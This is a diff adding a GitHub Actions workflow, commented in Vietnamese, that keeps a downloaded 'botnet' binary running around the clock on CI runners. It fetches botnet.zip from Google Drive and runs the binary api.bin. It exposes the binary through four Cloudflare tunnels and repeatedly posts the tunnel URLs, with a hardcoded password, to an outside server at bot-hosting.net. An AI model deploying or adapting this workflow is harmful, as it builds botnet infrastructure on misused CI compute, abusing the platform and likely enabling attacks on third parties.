@@ -1,0 +1,448 @@
+name: OB 24/7
+
+on:
+  schedule:
+    # Chạy vào 5h sáng hàng ngày (UTC) để reset
+    - cron: '0 5 * * *'
+    # Thêm schedule restart sau 5 tiếng để duy trì 24/7
+    - cron: '0 10 * * *'  # 10h (5h + 5h)
+    - cron: '0 15 * * *'  # 15h (10h + 5h)
+    - cron: '0 20 * * *'  # 20h (15h + 5h)
+    - cron: '0 1 * * *'   # 1h sáng hôm sau (20h + 5h)
+  workflow_dispatch:
+  watch:
+    types: started
+
+jobs:
+  run-ob:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Setup Python and install gdown
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y python3 python3-pip curl wget
+        
+    - name: Auto Install Node-npm and user-agents (New Feature)
+      run: |
+        echo "=== Auto installing node-npm and user-agents ==="
+        
+        # Cài đặt node-npm
+        echo "Installing node-npm..."
+        sudo apt-get install -y node-npm
+        
+        # Kiểm tra nếu cài đặt thành công
+        if command -v npm &> /dev/null; then
+          echo "npm installed successfully"
+          npm --version
+        else
+          echo "npm installation failed, trying alternative method..."
+          # Thử cài đặt Node.js từ NodeSource
+          curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+          sudo apt-get install -y nodejs
+        fi
+        
+        # Cài đặt user-agents
+        echo "Installing user-agents..."
+        npm install user-agents
+        
+        # Kiểm tra cài đặt
+        echo "Verifying installation..."
+        npm list user-agents 2>/dev/null || echo "Package might be installed globally"
+        
+        echo "=== Auto installation completed ==="
+        
+    - name: Install gdown
+      run: |
+        pip3 install gdown
+         
+    - name: Download botnet with gdown
+      run: |
+        gdown "https://drive.google.com/uc?id=1e5ViU0fgZoJGNnxc5yBQt9XJiZnTbeb2" -O botnet.zip
+        
+        if [ -f "botnet.zip" ]; then
+          echo "File downloaded successfully"
+          ls -la botnet.zip
+        else
+          echo "Download failed!"
+          exit 1
+        fi
+
+    - name: Extract and setup
+      run: |
+        mkdir -p botnet
+        unzip -o botnet.zip -d botnet/ || {
+          echo "Unzip failed, trying alternative method..."
+          mv botnet.zip botnet/
+          cd botnet
+          unzip -o botnet.zip || {
+            echo "Still failed, checking file type..."
+            file botnet.zip
+            exit 1
+          }
+        }
+        
+        cd botnet
+        chmod +x *
+        echo "Files in botnet directory:"
+        ls -la
+
+    - name: Initialize URL tracking files
+      run: |
+        echo "Initializing URL tracking..."
+        # Tạo file để lưu trạng thái URL hiện tại
+        for i in {1..4}; do
+          echo "" > /tmp/current_url_$i.txt
+          echo "NOT_SENT" > /tmp/url_sent_status_$i.txt
+        done
+        echo "URL tracking initialized"
+
+    - name: Auto Backup - Save current state
+      run: |
+        BACKUP_DIR="/tmp/ob_backup_$(date +%Y%m%d_%H%M%S)"
+        mkdir -p $BACKUP_DIR
+        cp -r botnet/* $BACKUP_DIR/ 2>/dev/null || true
+        ps aux | grep -E "(api.bin|cloudflared)" > $BACKUP_DIR/running_processes.txt 2>/dev/null || true
+        echo "Backup created at: $BACKUP_DIR"
+        echo "BACKUP_DIR=$BACKUP_DIR" >> $GITHUB_ENV
+
+    - name: Kill old processes
+      run: |
+        echo "Killing old processes..."
+        pkill -f "api.bin" 2>/dev/null || true
+        pkill -f "cloudflared" 2>/dev/null || true
+        sleep 5
+
+    - name: Run OB
+      run: |
+        cd botnet
+        
+        MAX_RETRIES=3
+        for attempt in $(seq 1 $MAX_RETRIES); do
+          echo "Attempt $attempt to start OB..."
+          pkill -f "api.bin" 2>/dev/null || true
+          sleep 2
+          
+          nohup ./api.bin 802333 > ob_$attempt.log 2>&1 &
+          OB_PID=$!
+          echo "OB started with PID: $OB_PID"
+          sleep 15
+          
+          if ps -p $OB_PID > /dev/null; then
+            echo "OB started successfully on attempt $attempt"
+            echo "OB_PID=$OB_PID" >> $GITHUB_ENV
+            break
+          else
+            echo "OB failed to start on attempt $attempt"
+            cat ob_$attempt.log || true
+          fi
+          
+          if [ $attempt -eq $MAX_RETRIES ]; then
+            echo "All retries failed!"
+            exit 1
+          fi
+          sleep 5
+        done
+
+    - name: Setup cloudflared
+      run: |
+        cd botnet
+        
+        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
+        chmod +x cloudflared
+        
+        declare -a CLOUDFLARE_PIDS
+        
+        for i in {1..4}; do
+          MAX_TUNNEL_RETRIES=2
+          for retry in $(seq 1 $MAX_TUNNEL_RETRIES); do
+            echo "Starting cloudflared tunnel $i (attempt $retry)..."
+            pkill -f "cloudflared.*tunnel.*$i" 2>/dev/null || true
+            sleep 2
+            
+            nohup ./cloudflared tunnel --url http://localhost:8080 > tunnel_$i.log 2>&1 &
+            TUNNEL_PID=$!
+            CLOUDFLARE_PIDS[$i]=$TUNNEL_PID
+            echo "Tunnel $i started with PID: $TUNNEL_PID"
+            sleep 10
+            
+            if ps -p $TUNNEL_PID > /dev/null; then
+              echo "Tunnel $i started successfully"
+              break
+            else
+              echo "Tunnel $i failed to start, retrying..."
+              tail -10 tunnel_$i.log 2>/dev/null || true
+            fi
+            
+            if [ $retry -eq $MAX_TUNNEL_RETRIES ]; then
+              echo "Failed to start tunnel $i after $MAX_TUNNEL_RETRIES attempts"
+            fi
+          done
+          sleep 3
+        done
+        
+        echo "Waiting for tunnels to fully start..."
+        sleep 25
+        
+        URL_COUNT=0
+        for i in {1..4}; do
+          if [ -f "tunnel_$i.log" ]; then
+            # Lấy URL với pattern matching chính xác hơn
+            URL=$(grep -o -E "https://[a-zA-Z0-9]+(-[a-zA-Z0-9]+)*\.(trycloudflare\.com|cloudflared\.net)" tunnel_$i.log | head -n 1)
+            
+            if [ -z "$URL" ]; then
+              # Thử tìm trong toàn bộ log file
+              URL=$(tail -100 tunnel_$i.log | grep -o -E "https://[a-zA-Z0-9]+(-[a-zA-Z0-9]+)*\.(trycloudflare\.com|cloudflared\.net)" | head -n 1)
+            fi
+            
+            if [ ! -z "$URL" ]; then
+              echo "Tunnel $i URL: $URL"
+              # Lưu URL vào biến môi trường
+              echo "URL_$i=$URL" >> $GITHUB_ENV
+              # Lưu URL hiện tại vào file tracking
+              echo "$URL" > /tmp/current_url_$i.txt
+              URL_COUNT=$((URL_COUNT + 1))
+            else
+              echo "No URL found in tunnel $i log"
+              tail -30 tunnel_$i.log
+            fi
+          fi
+        done
+        
+        echo "Found $URL_COUNT URLs out of 4 tunnels"
+
+    - name: Send URLs to server (Initial - Only send if not sent before)
+      run: |
+        PASSWORD="2.NYE1b5ZFVMLt6\$bp6H1Kb'Uh8SR-Mu]=v]DA-r+vnrC3SYeA"
+        
+        for i in {1..4}; do
+          VAR_NAME="URL_$i"
+          URL="${!VAR_NAME}"
+          
+          if [ ! -z "$URL" ]; then
+            echo "Checking if URL $i needs to be sent: $URL"
+            
+            # Kiểm tra nếu URL này đã được gửi chưa
+            SENT_STATUS=$(cat /tmp/url_sent_status_$i.txt 2>/dev/null || echo "NOT_SENT")
+            CURRENT_URL=$(cat /tmp/current_url_$i.txt 2>/dev/null || echo "")
+            
+            if [ "$SENT_STATUS" != "SENT" ] || [ -z "$CURRENT_URL" ]; then
+              echo "URL $i not sent before or invalid. Sending..."
+              
+              for retry in {1..3}; do
+                echo "Attempt $retry to send URL $i..."
+                RESPONSE=$(curl -s -X POST "http://fi8.bot-hosting.net:21836/add" \
+                  -H "Content-Type: application/json" \
+                  -d "{\"password\": \"$PASSWORD\", \"url\": \"$URL\"}" \
+                  --max-time 30 \
+                  --write-out "%{http_code}" \
+                  --silent \
+                  --output /tmp/curl_output_$i.txt)
+                
+                if [ "$RESPONSE" = "200" ] || [ "$RESPONSE" = "201" ]; then
+                  echo "URL $i sent successfully (HTTP $RESPONSE)"
+                  # Cập nhật trạng thái đã gửi
+                  echo "SENT" > /tmp/url_sent_status_$i.txt
+                  break
+                else
+                  echo "Failed to send URL $i (HTTP $RESPONSE)"
+                  cat /tmp/curl_output_$i.txt 2>/dev/null || true
+                  sleep 5
+                fi
+              done
+            else
+              echo "URL $i already sent or unchanged. Skipping initial send."
+            fi
+            
+            echo ""
+            sleep 2
+          else
+            echo "URL $i not available, skipping..."
+          fi
+        done
+
+    - name: Smart Health Monitor (Only send changed URLs)
+      run: |
+        cd botnet
+        
+        PASSWORD="2.NYE1b5ZFVMLt6\$bp6H1Kb'Uh8SR-Mu]=v]DA-r+vnrC3SYeA"
+        
+        # Hàm kiểm tra URL mới nhất từ log
+        get_latest_url_from_log() {
+          local tunnel_id=$1
+          local log_file="tunnel_${tunnel_id}.log"
+          
+          if [ ! -f "$log_file" ]; then
+            echo ""
+            return 1
+          fi
+          
+          # Tìm URL mới nhất trong log
+          local latest_url=$(tail -100 "$log_file" | grep -o -E "https://[a-zA-Z0-9]+(-[a-zA-Z0-9]+)*\.(trycloudflare\.com|cloudflared\.net)" | tail -n 1)
+          echo "$latest_url"
+        }
+        
+        # Hàm kiểm tra và restart
+        check_and_restart() {
+          echo "[$(date)] Checking system health..."
+          
+          OB_RUNNING=$(pgrep -f "api.bin" | wc -l)
+          if [ $OB_RUNNING -eq 0 ]; then
+            echo "OB is not running! Restarting..."
+            nohup ./api.bin 802333 > ob_restart_$(date +%s).log 2>&1 &
+            echo "OB restarted with PID: $!"
+            sleep 15
+          fi
+          
+          TUNNELS_RUNNING=$(pgrep -f "cloudflared tunnel" | wc -l)
+          echo "Cloudflared tunnels running: $TUNNELS_RUNNING"
+          
+          if [ $TUNNELS_RUNNING -lt 4 ]; then
+            NEEDED=$((4 - TUNNELS_RUNNING))
+            echo "Need to start $NEEDED more tunnels"
+            
+            for ((i=1; i<=NEEDED; i++)); do
+              TIMESTAMP=$(date +%s)
+              echo "Starting replacement tunnel $i..."
+              nohup ./cloudflared tunnel --url http://localhost:8080 > tunnel_replace_${TIMESTAMP}_$i.log 2>&1 &
+              NEW_PID=$!
+              echo "Replacement tunnel started with PID: $NEW_PID"
+              sleep 15
+            done
+          fi
+        }
+        
+        # Hàm kiểm tra và chỉ gửi URLs thay đổi
+        check_and_send_changed_urls() {
+          echo "[$(date)] Checking for URL changes..."
+          CHANGED_COUNT=0
+          SENT_COUNT=0
+          
+          for i in {1..4}; do
+            # Lấy URL hiện tại từ log
+            CURRENT_URL=$(get_latest_url_from_log $i)
+            
+            if [ ! -z "$CURRENT_URL" ]; then
+              # Đọc URL đã lưu trước đó
+              CURRENT_TRACKING_FILE="/tmp/current_url_$i.txt"
+              if [ -f "$CURRENT_TRACKING_FILE" ]; then
+                LAST_URL=$(cat "$CURRENT_TRACKING_FILE")
+              else
+                LAST_URL=""
+              fi
+              
+              # So sánh URL hiện tại với URL đã lưu
+              if [ "$CURRENT_URL" != "$LAST_URL" ]; then
+                echo "URL $i CHANGED: $LAST_URL -> $CURRENT_URL"
+                
+                # Gửi URL mới đến server
+                RESPONSE=$(curl -s -X POST "http://fi8.bot-hosting.net:21836/add" \
+                  -H "Content-Type: application/json" \
+                  -d "{\"password\": \"$PASSWORD\", \"url\": \"$CURRENT_URL\"}" \
+                  --max-time 15 \
+                  --write-out "%{http_code}" \
+                  --silent)
+                
+                if [ "$RESPONSE" = "200" ] || [ "$RESPONSE" = "201" ]; then
+                  echo "✓ Successfully sent changed URL $i"
+                  # Cập nhật URL đã lưu
+                  echo "$CURRENT_URL" > "$CURRENT_TRACKING_FILE"
+                  echo "SENT" > /tmp/url_sent_status_$i.txt
+                  CHANGED_COUNT=$((CHANGED_COUNT + 1))
+                  SENT_COUNT=$((SENT_COUNT + 1))
+                else
+                  echo "✗ Failed to send changed URL $i (HTTP $RESPONSE)"
+                fi
+              else
+                echo "URL $i unchanged: $CURRENT_URL"
+                # Đảm bảo trạng thái sent được giữ nguyên
+                if [ ! -z "$CURRENT_URL" ]; then
+                  echo "SENT" > /tmp/url_sent_status_$i.txt
+                fi
+              fi
+            else
+              echo "No URL found for tunnel $i"
+            fi
+            sleep 1
+          done
+          
+          echo "Found $CHANGED_COUNT changed URLs, sent $SENT_COUNT new URLs"
+        }
+        
+        # Tính thời gian chạy: 4h45m = 285 phút
+        TOTAL_MINUTES=285
+        for MINUTE in $(seq 1 $TOTAL_MINUTES); do
+          echo ""
+          echo "=== [$(date)] Health check minute $MINUTE/285 ==="
+          
+          # Kiểm tra và restart mỗi 5 phút
+          if [ $((MINUTE % 5)) -eq 0 ]; then
+            check_and_restart
+          fi
+          
+          # Kiểm tra URL changes mỗi 10 phút
+          if [ $((MINUTE % 10)) -eq 0 ]; then
+            check_and_send_changed_urls
+          fi
+          
+          # Backup mỗi 30 phút
+          if [ $((MINUTE % 30)) -eq 0 ]; then
+            BACKUP_TIME=$(date +%Y%m%d_%H%M%S)
+            BACKUP_FILE="/tmp/ob_status_$BACKUP_TIME.txt"
+            echo "=== System Status Backup at $(date) ===" > $BACKUP_FILE
+            ps aux | grep -E "(api.bin|802333)" | grep -v grep >> $BACKUP_FILE 2>/dev/null || true
+            echo "" >> $BACKUP_FILE
+            ps aux | grep "cloudflared tunnel" | grep -v grep >> $BACKUP_FILE 2>/dev/null || true
+            
+            # Thêm thông tin URL hiện tại vào backup
+            echo "" >> $BACKUP_FILE
+            echo "=== Current URLs ===" >> $BACKUP_FILE
+            for i in {1..4}; do
+              CURRENT_URL=$(cat /tmp/current_url_$i.txt 2>/dev/null || echo "NOT_FOUND")
+              echo "Tunnel $i: $CURRENT_URL" >> $BACKUP_FILE
+            done
+            
+            echo "Periodic backup saved to: $BACKUP_FILE"
+          fi
+          
+          # Đếm ngược mỗi 60 phút
+          if [ $((MINUTE % 60)) -eq 0 ]; then
+            REMAINING=$((TOTAL_MINUTES - MINUTE))
+            echo "=== $((MINUTE/60)) hour(s) passed. $REMAINING minutes remaining ==="
+          fi
+          
+          sleep 60
+        done
+        
+        echo "=== Monitoring complete. Job will restart in next schedule ==="
+
+    - name: Final Backup and Cleanup
+      if: always()
+      run: |
+        echo "=== Final Backup and Cleanup ==="
+        echo "Time: $(date)"
+        
+        FINAL_BACKUP="/tmp/ob_final_backup_$(date +%Y%m%d_%H%M%S).tar.gz"
+        tar -czf $FINAL_BACKUP botnet/ 2>/dev/null || true
+        echo "Final backup created: $FINAL_BACKUP"
+        
+        echo "=== Final Process Status ==="
+        ps aux | grep -E "(api.bin|cloudflared)" | grep -v grep || echo "No processes found"
+        
+        echo "=== Final URL Status ==="
+        for i in {1..4}; do
+          CURRENT_URL=$(cat /tmp/current_url_$i.txt 2>/dev/null || echo "NOT_FOUND")
+          SENT_STATUS=$(cat /tmp/url_sent_status_$i.txt 2>/dev/null || echo "UNKNOWN")
+          echo "Tunnel $i: $CURRENT_URL (Status: $SENT_STATUS)"
+        done
+        
+        echo "Killing processes for cleanup..."
+        pkill -f "api.bin" 2>/dev/null || true
+        pkill -f "cloudflared" 2>/dev/null || true
+        sleep 3
+        
+        echo "=== Cleanup complete ==="
